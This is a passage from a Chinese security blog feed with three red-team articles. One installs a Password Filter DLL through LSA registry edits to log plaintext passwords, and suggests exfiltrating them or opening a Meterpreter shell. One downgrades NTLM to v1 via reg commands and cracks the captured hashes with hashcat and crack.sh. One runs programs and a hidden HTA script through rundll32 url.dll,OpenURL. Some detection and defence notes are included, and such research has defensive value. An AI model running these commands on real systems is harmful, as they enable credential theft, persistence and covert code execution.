到 Z)</li><li>英文小写字母(a 到 z)</li><li>10 个基本数字(0 到 9)</li><li>非字母字符(例如 !、$、#、%)</li></ul><p>默认值:</p><ul><li>在域控制器上启用</li><li>在独立服务器上禁用</li></ul><p>如果该策略仍无法满足对密码复杂度的要求，可以使用Password Filter DLL进一步提高密码的复杂度</p><h3 id="实现思路："><a href="#实现思路：" class="headerlink" title="实现思路："></a>实现思路：</h3><ol><li>通过修改注册表的方式安装Password Filter DLL</li><li>用户修改密码时，自动加载Password Filter DLL，导入明文密码</li><li>在Password Filter DLL中开发者可以自定义密码复杂度，同明文密码的复杂度进行比较，如果明文密码不满足复杂度条件，弹框提醒用户，密码修改失败</li></ol><p>具体使用方法可参考官方文档：</p><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766(v=vs.85).aspx</a></p><h2 id="0x03-Password-Filter-DLL的开发"><a href="#0x03-Password-Filter-DLL的开发" class="headerlink" title="0x03 Password Filter DLL的开发"></a>0x03 Password Filter DLL的开发</h2><hr><p>支持以下三个函数：</p><ul><li><p>BOOLEAN InitializeChangeNotify(void);</p></li><li><p>NTSTATUS PasswordChangeNotify(_In_ PUNICODE_STRING UserName,_In_ ULONG RelativeId,_In_ PUNICODE_STRING NewPassword);</p></li><li><p>BOOLEAN PasswordFilter(_In_ PUNICODE_STRING AccountName,_In_ PUNICODE_STRING FullName,_In_ PUNICODE_STRING Password,_In_ BOOLEAN SetOperation);</p></li></ul><p>参考资料：</p><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms721849(v=vs.85).aspx#password_filter_functions" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ms721849(v=vs.85).aspx#password_filter_functions</a></p><p>值得注意的地方：</p><ul><li>API PasswordChangeNotify和PasswordFilter的传入参数均包括用户的明文密码</li><li>API PasswordFilter的返回值为TRUE表示密码符合要求，返回FALSE表示密码不符合复杂度要求，弹框提示用户修改</li><li>在编写Password Filter DLL时，需要声明导出函数</li></ul><p>提供一个可供参考的POC，地址如下：</p><p><a href="https://github.com/3gstudent/PasswordFilter" target="_blank" rel="noopener">https://github.com/3gstudent/PasswordFilter</a></p><p>该工程声明了导出函数<code>InitializeChangeNotify</code>、<code>PasswordChangeNotify</code>和<code>PasswordFilter</code></p><p>分别使用<code>PasswordChangeNotify</code>和<code>PasswordFilter</code>记录明文密码，保存在<code>c:\logFile1</code>和<code>c:\logFile2</code></p><p>在编译时需要同目标系统的平台对应</p><p>%wZ表示输出PUNICODE_STRING，unicode的字符串指针类型</p><h2 id="0x04-Password-Filter-DLL的安装"><a href="#0x04-Password-Filter-DLL的安装" class="headerlink" title="0x04 Password Filter DLL的安装"></a>0x04 Password Filter DLL的安装</h2><hr><p>1、注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code>Notification Packages</code>，添加Password Filter DLL的名称，不包括后缀名.dll</p><p>2、将Password Filter DLL保存在%windir%\system32\下</p><p>3、组策略开启组策略密码必须符合复杂性要求</p><p>4、重启系统(注销当前用户不会生效)</p><p>5、修改任一用户密码，加载Password Filter DLL</p><h3 id="实际测试："><a href="#实际测试：" class="headerlink" title="实际测试："></a>实际测试：</h3><p>测试系统： Windows Server 2008 R2 x64</p><p>将Password Filter DLL工程编译生成64位的Win32Project3.dll</p><p>1、将Win32Project3.dll保存在%windir%\system32\下</p><p>2、修改注册表键值<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code>Notification Packages</code>，添加<code>Win32Project3</code></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/2-1.png" alt="Alt text"></p><p>通过命令行实现的方式如下：</p><p>读取键值：</p><pre><code>REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot;</code></pre><p>获得键值内容：</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa    Notification Packages    REG_MULTI_SZ    scecli\0rassfm</code></pre><p>添加Win32Project3：</p><pre><code>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0rassfm\0Win32Project3&quot; /f</code></pre><p><strong>注：</strong></p><p><code>\0</code>表示换行</p><p>3、Windows Server系统的组策略默认开启密码必须符合复杂性要求</p><p>4、重启系统</p><p>5、修改用户密码</p><p>6、记录明文密码</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/2-2.png" alt="Alt text"></p><p><strong>注：</strong></p><p>能够记录所有用户，包括未登录用户</p><h2 id="0x05-域环境下的应用"><a href="#0x05-域环境下的应用" class="headerlink" title="0x05 域环境下的应用"></a>0x05 域环境下的应用</h2><hr><h3 id="1、记录明文密码"><a href="#1、记录明文密码" class="headerlink" title="1、记录明文密码"></a>1、记录明文密码</h3><p>针对域控服务器,需要获得域控服务器权限，在%windir%\system32\下放置Password Filter DLL，修改注册表键值</p><h4 id="优势："><a href="#优势：" class="headerlink" title="优势："></a>优势：</h4><p>域控服务器默认开启组策略密码必须符合复杂性要求</p><h4 id="不足："><a href="#不足：" class="headerlink" title="不足："></a>不足：</h4><p>必须重启系统才能生效，对于域控服务器来说，很少重启</p><h4 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h4><p>将payload改为将明文密码发送至Web服务器，可供参考的代码地址：</p><p><a href="https://malicious.link/post/2013/2013-09-11-stealing-passwords-every-time-they-change/" target="_blank" rel="noopener">https://malicious.link/post/2013/2013-09-11-stealing-passwords-every-time-they-change/</a></p><h3 id="2、后门"><a href="#2、后门" class="headerlink" title="2、后门"></a>2、后门</h3><p>将Password Filter DLL改为启动后门，例如弹回Meterpreter的shell</p><p>域内任一用户在修改密码时均会加载Password Filter DLL，弹回高权限的shell</p><h2 id="0x06-非Windows-Server系统的应用"><a href="#0x06-非Windows-Server系统的应用" class="headerlink" title="0x06 非Windows Server系统的应用"></a>0x06 非Windows Server系统的应用</h2><hr><p>目前大部分资料均认为Password Filter DLL仅适用Windows Server系统</p><p>对于非Windows Server系统来说，同样可以使用，只是组策略默认禁用<code>组策略密码必须符合复杂性要求</code></p><p>因此需要注意以下问题：</p><h3 id="1、命令行查看当前系统的组策略配置"><a href="#1、命令行查看当前系统的组策略配置" class="headerlink" title="1、命令行查看当前系统的组策略配置"></a>1、命令行查看当前系统的组策略配置</h3><p>组策略配置存储在数据库中，位于<code>%windir%\security\database\secedit.sdb</code></p><p>读取命令如下(管理员权限)：</p><pre><code>secedit /export /cfg gp.inf /quiet</code></pre><p>参数说明：</p><ul><li><p>没有设置/db参数，表示数据库采用默认<code>%windir%\security\database\secedit.sdb</code></p></li><li><p>/quiet表示不生成日志，否则生成的日志默认保存在<code>%windir%\security\logs\scesrv.log</code></p></li></ul><p>命令执行后生成文件gp.inf，查看gp.inf中的PasswordComplexity项，1代表开启，0代表关闭</p><p><strong>注：</strong></p><p>gp.inf中的内容不完整，想要获得完整的组策略配置还需要读取注册表</p><h3 id="2、修改组策略配置，开启组策略密码必须符合复杂性要求"><a href="#2、修改组策略配置，开启组策略密码必须符合复杂性要求" class="headerlink" title="2、修改组策略配置，开启组策略密码必须符合复杂性要求"></a>2、修改组策略配置，开启组策略密码必须符合复杂性要求</h3><p>首先导出配置文件gp.inf，将PasswordComplexity项设为1，保存</p><p>导入数据库：</p><pre><code>secedit /configure /db gp.sdb /cfg gp.inf /quiet</code></pre><p>刷新组策略，立即生效(否则，重启后生效)：</p><pre><code> gpupdate/force</code></pre><h2 id="0x07-防御检测"><a href="#0x07-防御检测" class="headerlink" title="0x07 防御检测"></a>0x07 防御检测</h2><hr><p>根据利用思路，攻击者首先需要获得当前系统的管理员权限</p><p>检测思路如下：</p><p>1、查看<code>%windir%\system32\</code>下有无可疑dll</p><p>2、查看注册表键值<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code>Notification Packages</code></p><p>3、查看进程lsass.exe加载的dll</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-3/3-1.png" alt="Alt text"></p><h2 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h2><hr><p>Password Filter DLL本是系统提供的正常功能，但如果获得了系统的管理员权限，利用这项功能不仅能够记录明文密码，还能用作后门。</p><p>本文结合具体的利用思路，介绍了检测方法。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows下的密码hash——Net-NTLMv1介绍</title>
    <link href="wiki.cfyqy.com/posts/13f32944.html"/>
    <id>wiki.cfyqy.com/posts/13f32944.html</id>
    <published>2018-05-25T13:03:44.918Z</published>
    <updated>2018-05-25T13:04:28.160Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">《Windows下的密码hash——NTLM hash和Net-NTLM hash介绍》</a>分别对NTLM hash和Net-NTLMv2 hash做了介绍，对于Net-NTLMv2的上一个版本Net-NTLMv1，在安全性上相对来说更脆弱，具体脆弱在哪里呢？本文将要进行介绍</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>Net-NTLMv1的加密方法</li><li>Net-NTLMv1的破解思路</li><li>Net-NTLMv1的利用思路</li></ul><h2 id="0x02-Net-NTLMv1的加密方法"><a href="#0x02-Net-NTLMv1的加密方法" class="headerlink" title="0x02 Net-NTLMv1的加密方法"></a>0x02 Net-NTLMv1的加密方法</h2><hr><p>对比Net-NTLMv2，Net-NTLMv2的加密流程如下：</p><ol><li>客户端向服务器发送一个请求</li><li>服务器接收到请求后，生成一个16位的Challenge，发送回客户端</li><li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li><li>服务器校验response</li></ol><p>Net-NTLMv1的加密流程如下：</p><ol><li>客户端向服务器发送一个请求</li><li>服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li><li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li><li>服务器校验response</li></ol><p>两者的流程相同，但加密算法不同，Net-NTLMv1相对脆弱</p><p>Net-NTLMv1 response的计算方法比较简单，方法如下(目前LM hash很少接触，不考虑)：</p><p>将用户的NTLM hash分成三组，每组7比特(长度不够末尾填0)，作为3DES加密算法的三组密钥，加密Server发来的Challenge</p><p>详情可参考：</p><p><a href="http://davenport.sourceforge.net/ntlm.html#theNtlmResponse" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html#theNtlmResponse</a></p><h2 id="0x03-Net-NTLMv1的破解思路"><a href="#0x03-Net-NTLMv1的破解思路" class="headerlink" title="0x03 Net-NTLMv1的破解思路"></a>0x03 Net-NTLMv1的破解思路</h2><hr><h3 id="1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解"><a href="#1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解" class="headerlink" title="1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解"></a>1、捕获Net-NTLMv1数据包，提取关键数据，使用hashcat进行字典破解</h3><p>服务器：</p><ul><li>系统： Server2008 x64</li><li>IP： 192.168.62.144</li><li>登录用户名： log1</li><li>登录密码： logtest123!</li></ul><p>客户端：</p><ul><li>系统： Win7 x64</li><li>IP： 192.168.62.137</li></ul><p>修改注册表开启Net-NTLMv1:</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f</code></pre><p><strong>注：</strong></p><p>自Windows Vista/Server2008开始，系统默认禁用Net-NTLMv1，使用Net-NTLMv2</p><p>仅修改客户端即可，服务器不用修改</p><p>客户端通过命令行远程连接服务器，命令如下：</p><pre><code>net use \\192.168.62.144 /u:log1 logtest123!</code></pre><p><strong>注：</strong></p><p>通过界面访问<code>\\192.168.62.144</code>的文件共享，会多一步验证操作，使用当前用户的口令进行验证</p><p>客户端运行Wireshark，捕获数据包，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-1.png" alt="Alt text"></p><p>前四个数据包对应NTLM认证的四个步骤</p><p>查看第二个数据包，获得Challenge，为<code>8d2da0f5e21e20ee</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-2.png" alt="Alt text"></p><p>查看第三个数据包，获得LM Response数据为<code>fec9b082080e34ba00000000000000000000000000000000</code>，获得NTLM Response数据为<code>51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04</code>，username为<code>a</code>，hostname为<code>WIN-BH7SVRRDGVA</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-3.png" alt="Alt text"></p><p>这里做一个对比，如果是Net-NTLMv2，Response数据多一项NTLMv2 Response，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-4.png" alt="Alt text"></p><p>下面，使用Hashcat对该Net-NTLM v1进行破解</p><p>NTLMv1的格式为：</p><p><code>username::hostname:LM response:NTLM response:challenge</code></p><p>构造后的数据如下：</p><p><code>log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</code></p><p>Hashcat参数如下：</p><pre><code>hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</code></pre><p>说明：</p><p>-m： hash-type，5500对应NetNTLMv1，详细参数可查表：<a href="https://hashcat.net/wiki/doku.php" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php</a>?</p><p>-o： 输出文件，字典文件为/tmp/password.list</p><p>–force代表强制执行，测试系统不支持Intel OpenCL</p><p>成功破解出登录的明文密码，输出如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/2-5.png" alt="Alt text"></p><h3 id="2、使用Responder等中间人攻击工具，控制Challenge为固定值1122334455667788"><a href="#2、使用Responder等中间人攻击工具，控制Challenge为固定值1122334455667788" class="headerlink" title="2、使用Responder等中间人攻击工具，控制Challenge为固定值1122334455667788"></a>2、使用Responder等中间人攻击工具，控制Challenge为固定值<code>1122334455667788</code></h3><p>可借助彩虹表还原出口令的NTLM hash</p><p>例如获得了如下NetNTLMv1 hash:</p><p><code>a::WIN-BH7SVRRDGVA:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a:1122334455667788</code></p><p>LM hash为<code>aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a</code></p><p>访问网站<a href="https://crack.sh/get-cracking/，使用免费的彩虹表进行破解" target="_blank" rel="noopener">https://crack.sh/get-cracking/，使用免费的彩虹表进行破解</a></p><p>填入的格式如下：</p><p><code>NTHASH:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a</code></p><p>接着填入邮箱地址，提交后，在很短的时间(1分钟以内)会收到邮件，提示破解成功</p><p>参考资料：</p><p><a href="https://crack.sh/netntlm/" target="_blank" rel="noopener">https://crack.sh/netntlm/</a></p><p>如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/3-1.png" alt="Alt text"></p><p>破解出的ntlm hash为<code>d25ecd13fddbb542d2e16da4f9e0333d</code>，用时45秒</p><p>使用mimikatz获得该用户的ntlm hash，对比结果相同，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/3-2.png" alt="Alt text"></p><h2 id="0x04-Net-NTLMv1的利用思路"><a href="#0x04-Net-NTLMv1的利用思路" class="headerlink" title="0x04 Net-NTLMv1的利用思路"></a>0x04 Net-NTLMv1的利用思路</h2><hr><p>由于Net-NTLMv1的脆弱性，在控制Challenge后可以在短时间内通过彩虹表还原出用户的ntlm hash，所以在利用上首选的是将Win7环境下的默认Net-NTLMv2降级到Net-NTLMv1，获取本机的通信数据，还原出ntlm hash，实现工具: InternalMonologue</p><p>下载地址：</p><p><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></p><p>通过修改注册表使Net-NTLMv2降级到Net-NTLMv1，获得正在运行的用户token，模拟用户同NTLM SSP进行交互，控制Challenge为固定值<code>1122334455667788</code>，导出返回的Net-NTLMv1 response</p><p><strong>注：</strong></p><p>修改注册表需要管理员权限</p><p>修改注册表开启Net-NTLMv1:</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f</code></pre><p>为确保Net-NTLMv1开启成功，还需要修改两处注册表键值：</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /freg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f</code></pre><p>获得的结果可以通过访问网站<a href="https://crack.sh/get-cracking/，使用免费的彩虹表进行破解，不再赘述" target="_blank" rel="noopener">https://crack.sh/get-cracking/，使用免费的彩虹表进行破解，不再赘述</a></p><p><strong>优点：</strong></p><ol><li>这种方式不会对lsass.exe进程进行操作</li><li>同本地NTLM SSP进行交互，不会产生流量</li><li>没有进行NTLM认证，不会产生日志</li></ol><p><strong>补充：</strong></p><p>如果以普通用户权限执行InternalMonologue，能够获得当前用户权限的Net-NTLMv2数据包，通过hashcat进行破解，能获得当前用户的明文口令</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-1.png" alt="Alt text"></p><p>如上图，获得Net-NTLMv2的数据包如下：</p><p><code>a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000</code></p><p>使用hashcat进行字典破解，参数如下：</p><p><code>hashcat -m 5600 a::WIN-BH7SVRRDGVA:1122334455667788:db18ac502e829dfab120e78c041e2f87:01010000000000008e2ddebb92c2d30175f9bda99183337900000000020000000000000000000000 /tmp/password.list --force</code></p><p>成功破解，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-2.png" alt="Alt text"></p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-23/4-3.png" alt="Alt text"></p><h2 id="0x05-防御思路"><a href="#0x05-防御思路" class="headerlink" title="0x05 防御思路"></a>0x05 防御思路</h2><hr><p>自Windows Vista起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限</p><p>而对于Net-NTLMv2协议，即使抓到了通信数据包，只能对其进行字典攻击或是暴力破解，破解的概率不是很高</p><p>综上，自Windows Vista起，系统默认使用的Net-NTLMv2协议在安全性上能够保证</p><h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr><p>本文对Net-NTLMv1的加密方法和破解思路进行了介绍，分析测试了工具InternalMonologue，通过InternalMonologue能在普通用户权限下获得Net-NTLMv2数据，这个功能非常棒。</p><hr><p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;\assets\js\APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;hr
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于利用rundll32执行程序的分析</title>
    <link href="wiki.cfyqy.com/posts/cd246ac0.html"/>
    <id>wiki.cfyqy.com/posts/cd246ac0.html</id>
    <published>2018-05-25T13:03:44.915Z</published>
    <updated>2018-05-25T13:04:28.159Z</updated>
    
    <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr><p>最近看到了一篇有趣的文章<a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/" target="_blank" rel="noopener">《Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement》</a>，介绍了利用rundll32.exe加载url.dll，通过导出函数OpenURL执行程序的方法。于是我对此做了研究，整理成文，解决以下问题：</p><ul><li>利用rundll32执行程序的细节和原理</li><li>利用脚本批量扫描dll，查找能够执行程序的dll</li></ul><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr><p>本文将要介绍以下内容：</p><ul><li>rundll32加载dll的用法</li><li>OpenURL的用法</li><li>API ShellExecute的用法</li><li>三者结合实现通过rundll32直接执行程序</li><li>寻找其他可用的导出函数</li><li>利用powershell脚本批量获得dll的导出函数，筛选特定dll</li></ul><h2 id="0x02-相关细节"><a href="#0x02-相关细节" class="headerlink" title="0x02 相关细节"></a>0x02 相关细节</h2><hr><h3 id="1、rundll32加载dll的用法"><a href="#1、rundll32加载dll的用法" class="headerlink" title="1、rundll32加载dll的用法"></a>1、rundll32加载dll的用法</h3><p>官方文档：</p><p><a href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface" target="_blank" rel="noopener">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p><p>用法：</p><pre><code>rundll32 &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</code></pre><p>参数<code>&lt;entrypoint&gt;</code>代表传入dll的导出函数名，在dll中定义如下：</p><pre><code>void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);</code></pre><p>参数<code>&lt;optional arguments&gt;</code>对应dll导出函数中的<code>LPSTR lpszCmdLine</code></p><p>也就是说通过rundll32能控制dll导出函数的<code>LPSTR lpszCmdLine</code>参数</p><h3 id="2、OpenURL的用法"><a href="#2、OpenURL的用法" class="headerlink" title="2、OpenURL的用法"></a>2、OpenURL的用法</h3><p>这里直接参考文章中的提示，找到url.dll，包含导出函数OpenURL</p><p>使用IDA查看url.dll的导出函数OpenURL，其中调用了API ShellExecute，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-1.png" alt="Alt text"></p><p>查看伪代码，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-2.png" alt="Alt text"></p><p>注意ShellExecute的第二个参数为NULL，第三个参数lpFile对应传入的参数lpFile</p><h3 id="3、API-ShellExecute的用法"><a href="#3、API-ShellExecute的用法" class="headerlink" title="3、API ShellExecute的用法"></a>3、API ShellExecute的用法</h3><p>函数原型与参数定义如下：</p><pre><code>HINSTANCE ShellExecute(  _In_opt_ HWND    hwnd,  _In_opt_ LPCTSTR lpOperation,  _In_     LPCTSTR lpFile,  _In_opt_ LPCTSTR lpParameters,  _In_opt_ LPCTSTR lpDirectory,  _In_     INT     nShowCmd);</code></pre><p>第二个参数为NULL时，表示执行默认操作”open”</p><p>第三个参数lpFile表示要打开的程序或文件路径</p><p>也就是说，url.dll中导出函数OpenURL的参数lpFile决定API ShellExecute要打开的程序或文件路径</p><p>综上，</p><pre><code>rundll32.exe url.dll,OpenURL calc.exe</code></pre><p>实际上的操作为<code>ShellExecuteA(hwnd, NULL, &quot;calc.exe&quot;, NULL, NULL, nShowCmd);</code>，即执行计算器</p><p>使用Immunity Debugger动态调试，跟踪到<code>ShellExecuteA</code>，验证判断，传入的参数为<code>calc.exe</code>，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/2-3.png" alt="Alt text"></p><h2 id="0x03-扩展利用"><a href="#0x03-扩展利用" class="headerlink" title="0x03 扩展利用"></a>0x03 扩展利用</h2><hr><h3 id="1、查找url-dll中其它可供利用的导出函数"><a href="#1、查找url-dll中其它可供利用的导出函数" class="headerlink" title="1、查找url.dll中其它可供利用的导出函数"></a>1、查找url.dll中其它可供利用的导出函数</h3><p>IDA加载url.dll，选择<code>Search</code> - <code>text...</code>，搜索<code>ShellExecuteA</code></p><p>导出函数FileProtocolHandler同样调用API ShellExecute，如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-1.png" alt="Alt text"></p><p>测试命令如下：</p><pre><code>rundll32.exe url.dll,FileProtocolHandler calc.exe</code></pre><p>执行计算器</p><h3 id="2、查看其它dll是否包含导出函数OpenURL"><a href="#2、查看其它dll是否包含导出函数OpenURL" class="headerlink" title="2、查看其它dll是否包含导出函数OpenURL"></a>2、查看其它dll是否包含导出函数OpenURL</h3><p><strong>实现思路：</strong></p><p>枚举<code>%windir%/system32</code>下所有dll的导出函数，筛选出包含导出函数OpenURL的dll</p><p>通过powershell获得dll的导出函数可参考FuzzySecurity的代码，地址如下：</p><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</a></p><p>在这个代码的基础上，添加枚举dll的功能，分别获得导出函数，进行判断</p><p><strong>实现细节：</strong></p><p>(1)枚举<code>c:\windows\system32</code>下的所有dll：</p><pre><code>$DllSearchPath = dir c:\windows\system32\*.dllforeach($DllName in $DllSearchPath){       $DllName.Name}</code></pre><p>(2)对于<code>c:\windows\system32\auditpolmsg.dll</code></p><p>会报错提示输入字符串的格式不正确，所以对语句<code>$OffsetPtr = New-Object System.Intptr -ArgumentList $($HModule.ToInt64() + $ExportRVA)</code>加入try catch判断</p><p>代码位置：</p><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141</a></p><p>(3)对于<code>c:\windows\system32\avicap.dll</code></p><p>会报错，尝试读取或写入受保护的内存，对语句<code>$EXPORT_DIRECTORY_FLAGS = [system.runtime.interopservices.marshal]::PtrToStructure($OffsetPtr, [type]$IMAGE_EXPORT_DIRECTORY)</code><br>加入try catch判断</p><p>(4)目前代码只支持32位dll的判断</p><p>完整代码可参考：</p><p><a href="https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1</a></p><p>执行如下图，获得其他两个dll，分别为ieframe.dll和shdocvw.dll</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-2.png" alt="Alt text"></p><p>使用IDA加载ieframe.dll，查看导出函数OpenURL，伪代码如下图</p><p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-21/3-3.png" alt="Alt text"></p><p>由<code>CInternetShortcut</code>可以得知执行的文件为.url文件</p><p>编写一个.url文件，内容如下：</p><pre><code>[InternetShortcut]URL=c:\windows\system32\calc.exe</code></pre><p>cmd:</p><pre><code>rundll32.exe ieframe.dll,OpenURL C:\4\calc.url</code></pre><p>成功执行，弹出计算器</p><p>同样，shdocvw.dll也是相同的测试结果</p><h3 id="3、执行的程序类型"><a href="#3、执行的程序类型" class="headerlink" title="3、执行的程序类型"></a>3、执行的程序类型</h3><p>调用API ShellExecute执行程序，不仅支持exe，也同样支持脚本</p><p>例如执行js文件，内容如下：</p><pre><code>WScript.Echo(&quot;1&quot;);</code></pre><p>cmd：</p><pre><code>rundll32.exe url.dll,OpenURL C:\4\echo.js</code></pre><p>执行后弹框</p><p>例如hta文件，内容如下：</p><pre><code>&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;calc.exe&quot;self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; </code></pre><p>cmd:</p><pre><code>rundll32.exe url.dll,OpenURLA 